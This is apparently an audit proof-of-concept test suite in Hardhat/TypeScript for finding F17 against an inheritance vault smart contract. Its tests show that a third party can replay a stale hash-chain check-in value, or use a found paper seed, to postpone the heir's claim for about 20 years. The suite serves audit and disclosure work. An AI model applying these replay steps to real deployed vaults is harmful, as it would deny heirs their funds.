// v1 evidence suite (audit/2026-09-preliminary). Ported from the audit PoC sandbox poc/F17/test/poc-F17.ts.
// Contract under test: contracts/v1/InheritanceVaultV1.sol (the deployed v1 source, renamed). See ../README.md.
/**
 * PoC for F17: check-in chain values are bearer credentials over TIMING.
 *
 *   README.md:28-29  "Lost wallet insurance ... from a 32-byte paper seed ... liveness only,
 *                     never authority."
 *   InheritanceVault.sol:525  "it proves liveness, not authority."
 *
 * checkInByChain (InheritanceVault.sol:535-548) is permissionless, is not bound to msg.sender,
 * and a preimage carries no freshness: whenever it is mined it calls _resetClock, which sets
 * deadline = min(now + inactivityPeriod, absoluteDeadline).
 *
 * The first two tests assert the property the public text promises and FAIL on the current code.
 * The third quantifies the damage and passes (it records the observed behaviour).
 */
import { expect } from "chai";
import { ethers } from "hardhat";
import { loadFixture, time } from "@nomicfoundation/hardhat-network-helpers";

const DAY = 86_400;
const YEAR = 365 * DAY;
const PERIOD = 90 * DAY; // exploit scenario: 90-day inactivity period
const WINDOW = 14 * DAY;
const NATIVE = ethers.ZeroAddress;
const DEPOSIT = ethers.parseEther("10");
const FEE_BPS = 50;
const APP_DEFAULT_HORIZON = 20 * YEAR; // site/assets/app.js:436-439 pre-fills today + 20 years

/** S/KEY chain: values[k] = H^k(seed); values[0] = seed. Anchor = values[n]. */
function buildChain(n: number) {
  const values: string[] = [ethers.hexlify(ethers.randomBytes(32))];
  for (let k = 1; k <= n; k++) values.push(ethers.keccak256(values[k - 1]));
  return values;
}

describe("F17 chain values are bearer credentials over timing", () => {
  // Evidence-suite port: start from a fresh chain, as this PoC did alone in its audit sandbox. In the
  // combined audit:v1 run, earlier files leave state behind (nonces, balances, deployments, block time).
  before(async () => {
    await (await import("@nomicfoundation/hardhat-network-helpers")).reset();
  });

  async function fixture() {
    const [admin, alice, bob, carol, dave, mallory, feeSink] = await ethers.getSigners();
    const Vault = await ethers.getContractFactory("InheritanceVaultV1", admin);
    const vault = await Vault.deploy(admin.address, FEE_BPS, feeSink.address);
    const horizon = (await time.latest()) + APP_DEFAULT_HORIZON;
    await vault
      .connect(alice)
      .createVault(NATIVE, DEPOSIT, bob.address, PERIOD, WINDOW, horizon, { value: DEPOSIT });
    return { vault, admin, alice, bob, carol, dave, mallory, horizon };
  }

  it("[F17-a freshness] a broadcast-but-unmined chain value cannot push the deadline past the owner's last real action + one period", async () => {
    const f = await loadFixture(fixture);
    const N = 10;
    const chain = buildChain(N);

    // Alice installs a 10-use chain. This is her last genuine action.
    await f.vault.connect(f.alice).setCheckInChain(0, chain[N], N);
    const tLastGenuine = await time.latest();
    expect((await f.vault.getVault(f.alice.address, 0)).deadline).to.equal(BigInt(tLastGenuine + PERIOD));

    // Alice also broadcasts checkInByChain(H^9) right away (e.g. via a relayer or a keyless
    // wallet with too-low gas). It is evicted and never mined; she dies before rebroadcasting.
    // Dave (mempool observer / relayer) kept the calldata. It is still valid: no freshness.
    const stale = chain[N - 1];

    // Dave waits until one minute before the deadline and submits it.
    await time.increaseTo(tLastGenuine + PERIOD - 60);
    await f.vault.connect(f.dave).checkInByChain(f.alice.address, 0, stale);
    const newDeadline = Number((await f.vault.getVault(f.alice.address, 0)).deadline);

    const extraSecs = newDeadline - (tLastGenuine + PERIOD);
    console.log(
      `      owner's last real action: t0; deadline she earned: t0+${PERIOD / DAY}d; ` +
        `deadline after Dave's stale submission: t0+${((newDeadline - tLastGenuine) / DAY).toFixed(4)}d ` +
        `(+${(extraSecs / DAY).toFixed(4)} days handed to a third party)`
    );

    // INTENDED: a check-in the owner produced at t0 should buy at most t0 + PERIOD.
    expect(newDeadline, "stale chain value extended the deadline past owner's last action + PERIOD").to.be.lte(
      tLastGenuine + PERIOD
    );
  });

  it("[F17-b 'never authority'] a non-owner who holds the paper seed cannot keep the heir out once the owner is silent", async () => {
    const f = await loadFixture(fixture);
    const N = 1000;
    const chain = buildChain(N);

    // Alice installs a 1000-use chain and keeps the seed in a desk drawer. Last genuine action.
    await f.vault.connect(f.alice).setCheckInChain(0, chain[N], N);
    const tAliceLast = await time.latest();

    // Alice dies. Mallory (a relative who is NOT the heir) finds the seed and checks in at day 80.
    await time.increaseTo(tAliceLast + 80 * DAY);
    await f.vault.connect(f.mallory).checkInByChain(f.alice.address, 0, chain[N - 1]);

    // Day 90 + 1 day: Alice's key has been silent for more than a full inactivity period.
    await time.increaseTo(tAliceLast + PERIOD + DAY);

    // INTENDED ("liveness only, never authority"): the seed holder has no say over when the heir
    // may claim, so Bob's claim goes through. The revert (if any) is decoded so the failure
    // message names the guard that stopped him.
    let revertedWith = "none";
    try {
      await f.vault.connect(f.bob).initiateClaim(f.alice.address, 0, f.bob.address);
    } catch (e: any) {
      const parsed = f.vault.interface.parseError(e.data ?? e.error?.data ?? "0x");
      revertedWith = parsed
        ? `${parsed.name}(${parsed.args.map((a: any) => a.toString()).join(",")})`
        : String(e.message);
    }
    const dl = Number((await f.vault.getVault(f.alice.address, 0)).deadline);
    console.log(
      `      Alice silent since t0; now t0+${PERIOD / DAY + 1}d; deadline moved by Mallory to ` +
        `t0+${((dl - tAliceLast) / DAY).toFixed(4)}d; Bob's initiateClaim -> ${revertedWith}`
    );
    expect(revertedWith, "heir blocked by a non-owner seed holder").to.equal("none");
  });

  it("[F17-quant] damage: a seed holder alone postpones the heir from t0+PERIOD to the horizon (20-year app default)", async () => {
    const f = await loadFixture(fixture);
    const N = 1000;
    const chain = buildChain(N);

    await f.vault.connect(f.alice).setCheckInChain(0, chain[N], N);
    const tAliceLast = await time.latest();
    const heirShouldClaimAt = tAliceLast + PERIOD; // what an heir expects after the owner dies

    // Mallory checks in every 80 days; before each of her check-ins Bob tries and fails.
    let k = N - 1;
    let used = 0;
    let bobRejections = 0;
    for (;;) {
      const next = (await time.latest()) + 80 * DAY;
      if (next >= f.horizon) break;
      await time.increaseTo(next);
      await expect(f.vault.connect(f.bob).initiateClaim(f.alice.address, 0, f.bob.address))
        .to.be.revertedWithCustomError(f.vault, "NotYetExpired");
      bobRejections++;
      await f.vault.connect(f.mallory).checkInByChain(f.alice.address, 0, chain[k--]);
      used++;
    }

    const v = await f.vault.getVault(f.alice.address, 0);
    // The last check-in clamped the deadline to the horizon.
    expect(v.deadline).to.equal(BigInt(f.horizon));
    expect(v.state).to.equal(1); // still ACTIVE: no claim was ever possible

    // Bob can only claim once the horizon arrives.
    await time.increaseTo(f.horizon - 10);
    await expect(f.vault.connect(f.bob).initiateClaim(f.alice.address, 0, f.bob.address))
      .to.be.revertedWithCustomError(f.vault, "NotYetExpired");
    await time.increaseTo(f.horizon);
    await f.vault.connect(f.bob).initiateClaim(f.alice.address, 0, f.bob.address);

    const delay = f.horizon - heirShouldClaimAt;
    console.log(
      `      Mallory used ${used} of ${N} chain values (zero owner involvement); ` +
        `Bob rejected ${bobRejections} times; heir delayed ${(delay / YEAR).toFixed(2)} years ` +
        `(claim eligible at horizon instead of t0+${PERIOD / DAY}d); chain values left: ${v.hbLeft}`
    );
    expect(delay).to.be.gt(19 * YEAR);
  });
});
